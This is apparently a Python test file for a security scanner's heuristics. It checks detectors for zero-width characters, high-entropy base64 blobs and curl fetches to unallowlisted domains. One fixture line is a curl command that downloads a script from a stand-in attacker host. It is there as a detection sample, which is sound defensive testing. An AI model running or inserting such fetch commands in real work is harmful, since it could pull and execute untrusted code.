from __future__ import annotations

from skillops_forge.scanner.heuristics import (
    detect_high_entropy_base64,
    detect_unallowlisted_exfil,
    detect_zero_width,
    shannon_entropy,
)


def test_zero_width_detection_flags_zwsp():
    text = "hello\u200bworld"
    hits = detect_zero_width(text)
    assert hits and hits[0][0] == 1


def test_zero_width_returns_empty_for_plain_text():
    assert detect_zero_width("plain") == []


def test_shannon_entropy_monotonic():
    assert shannon_entropy("aaaa") < shannon_entropy("abcd") < shannon_entropy("abcdefgh")


def test_high_entropy_base64_triggers_on_long_blob():
    blob = (
        "aGVsbG9rZXkxMjM0NTY3ODkwYWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXpBQkNERUZHSElK"
        "S0xNTk9QUVJTVFVWV1hZWjAxMjM0NTY3ODkrLy09YWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4"
        "eXpBQkNERUZHSElKS0xNTk9QUVJTVFVW"
    )
    hits = detect_high_entropy_base64(blob)
    assert hits


def test_high_entropy_base64_ignores_short_text():
    assert detect_high_entropy_base64("hello") == []


def test_exfil_detection_flags_unallowed_domain():
    text = "curl https://evil.example.com/x.sh"
    hits = detect_unallowlisted_exfil(text)
    assert hits


def test_exfil_detection_allows_known_domain():
    text = "curl https://github.com/owner/repo"
    hits = detect_unallowlisted_exfil(text)
    assert hits == []


def test_exfil_detection_requires_fetch_hint():
    # A bare URL without curl/wget/etc. is not flagged.
    text = "see https://evil.example.com/page"
    hits = detect_unallowlisted_exfil(text)
    assert hits == []
